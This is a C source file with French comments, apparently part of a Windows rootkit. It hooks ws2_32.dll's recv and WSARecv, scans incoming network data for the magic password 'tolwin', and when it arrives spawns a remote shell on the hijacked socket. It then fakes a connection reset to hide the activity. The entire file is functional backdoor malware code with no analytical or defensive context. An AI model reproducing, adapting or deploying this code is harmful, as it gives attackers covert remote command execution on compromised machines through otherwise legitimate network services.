#include <winsock2.h>
#include <stdio.h>

#include "hook_utils.h"
#include "server.h"
#include "doexec.h"


//MAGIC KEY
char mot_de_passe[] = "tolwin\n";

//Quelques imports
extern char* debug_string[2049];
extern bool ALLOW_OUTBOUND;


//import de fonctions de ws2_32 qu'on va utiliser
typedef int          (WINAPI *type_send) (SOCKET,const char FAR * ,int,int);
type_send            import_send = NULL;
typedef int          (WINAPI *type_recv) (SOCKET,char FAR*,int,int);
type_recv            import_recv = NULL;
typedef int          (WINAPI *type_closesocket) (SOCKET);
type_closesocket     import_closesocket = NULL;
typedef void         (WINAPI *type_wsasetlasterror) (int);
type_wsasetlasterror import_wsasetlasterror = NULL;
typedef int          (WINAPI *type_wsagetlasterror) (void);
type_wsagetlasterror import_wsagetlasterror = NULL;


//Les infos pour les APIS injectées :
int _stdcall NewRecv (int s, char FAR* buf, int len, int flags);
char* backup_api_recv = NULL;

int _stdcall NewWSARecv (SOCKET s,LPWSABUF lpBuffers,DWORD dwBufferCount,LPDWORD lpNumberOfBytesRecvd,LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped,LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionROUTINE);
char* backup_api_wsarecv = NULL;




int importe_fx ()
	{
		// Chope les fx qu'on utilisera
		HMODULE adresse_ws2_32;
		if ((adresse_ws2_32 = GetModuleHandle("ws2_32.dll")) == 0)	return FALSE;
		if ((import_send = (type_send) GetProcAddress(adresse_ws2_32,"send")) == 0) return FALSE;
		if ((import_recv = (type_recv) GetProcAddress(adresse_ws2_32,"recv")) == 0) return FALSE;
		if ((import_closesocket = (type_closesocket) GetProcAddress(adresse_ws2_32,"closesocket")) == 0) return FALSE;
		if ((import_wsasetlasterror = (type_wsasetlasterror) GetProcAddress(adresse_ws2_32,"WSASetLastError")) == 0) return FALSE;
		if ((import_wsagetlasterror = (type_wsagetlasterror) GetProcAddress(adresse_ws2_32,"WSAGetLastError")) == 0) return FALSE;
		
		return TRUE;
	}




// -----------------------------------------------------------------------------------------------------------------------
// FONCTIONS PUBLIQUES : HOOK ET DEHOOK ----------------------------------------------------------------------------------
// -----------------------------------------------------------------------------------------------------------------------
int WINAPI hook_ws2_32 ()
	{
		// Chope les fx qu'on utilisera
		DWORD offset_new_fx;
		
		_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll hook\n",GetNameByPID(GetCurrentProcessId()));
		send_debug ((char*)debug_string);
		
		importe_fx ();
		
						
		// Hook de recv
		__asm lea eax,NewRecv
		__asm mov offset_new_fx,eax
		if (!backup_api_recv)
			initialise_hook("WS2_32.dll", "recv",    offset_new_fx,    &backup_api_recv   );

		if (backup_api_recv)
		{
			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:recv hook succes\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		else
		{
			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:recv hook echec\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}

		// Hook de WSARecv
		__asm lea eax,NewWSARecv
		__asm mov offset_new_fx,eax
		if (!backup_api_wsarecv)
			initialise_hook("WS2_32.dll", "WSARecv", offset_new_fx, &backup_api_wsarecv);

		if (backup_api_wsarecv)
		{
			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:WSARecv hook succes\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		else
		{
			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:WSARecv hook echec\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		

		// Fin
		return TRUE;
	}



int WINAPI free_ws2_32 ()
	{
		if (backup_api_recv)
			enleve_hook("WS2_32.dll", "recv",    &backup_api_recv    );

		if (backup_api_wsarecv)
			enleve_hook("WS2_32.dll", "WSARecv", &backup_api_wsarecv );
		

		// Fin
		return TRUE;
	}


// -----------------------------------------------------------------------------------------------------------------------
// FONCTIONS PRIVEES : NOUVEAUX HANDLERS ---------------------------------------------------------------------------------
// -----------------------------------------------------------------------------------------------------------------------

// Nouveau handler pour RECV
int _stdcall NewRecv (int s,char FAR* buf,int len,int flags)
	{
		int return_val;

		// recv d'origine
		__asm
		{
			push dword ptr [ebp+14h]
			push dword ptr [ebp+10h]
			push dword ptr [ebp+0Ch]
			push dword ptr [ebp+8]

			call backup_api_recv
			mov return_val,eax
		}

		// Regarde ma condition
		if ( !strncmp(buf,mot_de_passe,strlen(mot_de_passe)) )
		{
			_snprintf((char*)debug_string,2048, "% 20s - recv detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
			//Lance le shell
			doexec(s);
			//Règle l'erreur et cassos
			import_wsasetlasterror(WSAECONNRESET);import_closesocket(s);return SOCKET_ERROR ;
		}

		// Sinon, comme si de rien n'etait
		return return_val;
	}	

	
// Nouveau handler pour WSARECV
/*
lpBuffers
    [in, out] Pointer to an array of WSABUF structures. Each WSABUF structure contains a pointer to a buffer and the length of the buffer, in bytes.
typedef struct __WSABUF {
  u_long len;
  char FAR* buf;
} WSABUF, 
*LPWSABUF;
*/

int _stdcall NewWSARecv (SOCKET s,LPWSABUF lpBuffers,DWORD dwBufferCount,LPDWORD lpNumberOfBytesRecvd,LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped,LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
	{
		int return_val;
		DWORD taille_mot_de_passe = strlen(mot_de_passe);

		// Ancien appel
		__asm
		{
			push dword ptr [ebp+20h]
			push dword ptr [ebp+1Ch]
			push dword ptr [ebp+18h]
			push dword ptr [ebp+14h]
			push dword ptr [ebp+10h]
			push dword ptr [ebp+0Ch]
			push dword ptr [ebp+8]
			
			call backup_api_wsarecv
			mov return_val,eax
		}

		// WSARecv renvoie 0 : pas d'erreur et la fx termine immediatement -----------
		// Code de retour zero et pas overlap ----------------------------------------
		if ( (return_val == 0) && (lpOverlapped == NULL) )
		{
			//Si buffer non nul et réception de la bonne taille
			if ( (lpBuffers != NULL) && (lpBuffers->buf != NULL) && (*lpNumberOfBytesRecvd == taille_mot_de_passe) )
			{
				// Compare la chaine
				bool verdict = true;
				for(DWORD i = 0; i < taille_mot_de_passe;i++)
					if (lpBuffers->buf[i] != mot_de_passe[i])
						{verdict = false;break;}
	
				// Si comparaison ok lance le shell
				if (verdict)
				{
					// Efface le buffer et lance le shell
					_snprintf((char*)debug_string,2048, "% 20s - WSARecv (ok / non-overlap) detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
					send_debug ((char*)debug_string);
	
					for(i = 0; i < taille_mot_de_passe;i++)
						lpBuffers->buf[i] = 0;
				
					doexec(s);

					// Rend le socket invalide et cassos
					import_wsasetlasterror(WSAECONNRESET);
					import_closesocket(s);
					return SOCKET_ERROR;
				}
			}	
		}
	
		// Autre cas : erreur ou WSA IO PENDING -----------------------------------------
		else if ( (return_val == -1 ) && (import_wsagetlasterror() == WSA_IO_PENDING) )
		{
			bool verdict;
			bool premiere_passe;

			_snprintf((char*)debug_string,2048, "% 20s - WSARecv %d buffers\n",GetNameByPID(GetCurrentProcessId()), dwBufferCount);
			send_debug ((char*)debug_string);
			_snprintf((char*)debug_string,2048, "% 20s - WSARecv completion routine 0x%08X\n",GetNameByPID(GetCurrentProcessId()), lpCompletionRoutine);
			send_debug ((char*)debug_string);

			//Compare à l'offset sur le buffer 1
			DWORD le_bon_buffer;
			verdict = true;
			for (le_bon_buffer = 0; le_bon_buffer < dwBufferCount;le_bon_buffer++)
			{
				premiere_passe = true;
				
				for(DWORD i = 0; i < taille_mot_de_passe;i++)
					if (lpBuffers[le_bon_buffer].buf[i] != mot_de_passe[i])
						{verdict = false;break;}

				//Si non, compare pre-offset
				if (!verdict)
				{
					verdict = true;
					premiere_passe = false;
					for(DWORD i = 0; i < taille_mot_de_passe;i++)
						if (lpBuffers[le_bon_buffer].buf[i-taille_mot_de_passe] != mot_de_passe[i])
							{verdict = false;break;}
				}

				if (verdict)
					break;
			}

			if (verdict)
			{
				// Efface le buffer et lance le shell
				_snprintf((char*)debug_string,2048, "% 20s - WSARecv (err / pending) detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
				send_debug ((char*)debug_string);
				
				if (premiere_passe)
					for(DWORD i = 0; i < taille_mot_de_passe;i++)
						lpBuffers[le_bon_buffer].buf[i] = 0;
				else
					for(DWORD i = 0; i < taille_mot_de_passe;i++)
						lpBuffers[le_bon_buffer].buf[i-taille_mot_de_passe] = 0;

				doexec(s);
		
				// Rend le socket invalide et cassos
				char message_fin[] = "Connection terminee\nCtrl-C peut etre necessaire pour quiter\n";
				import_send(s, message_fin, strlen(message_fin), 0);

				*lpNumberOfBytesRecvd = 0;
				import_wsasetlasterror(WSA_IO_PENDING);
				return SOCKET_ERROR;
			}
		}
	
		// Sinon, comme si de rien n'etait
		return return_val;
	}


